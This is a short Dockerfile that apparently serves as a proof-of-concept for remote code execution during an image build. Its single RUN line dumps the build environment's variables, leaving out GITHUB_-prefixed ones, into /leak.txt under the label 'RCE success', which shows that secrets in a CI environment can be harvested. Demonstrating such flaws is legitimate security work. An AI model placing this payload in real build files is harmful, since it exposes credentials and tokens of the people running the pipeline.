ARG PYTHON_VERSION
FROM python:${PYTHON_VERSION}-alpine

RUN echo "RCE success: $(env | grep -v '^GITHUB_')" > /leak.txt
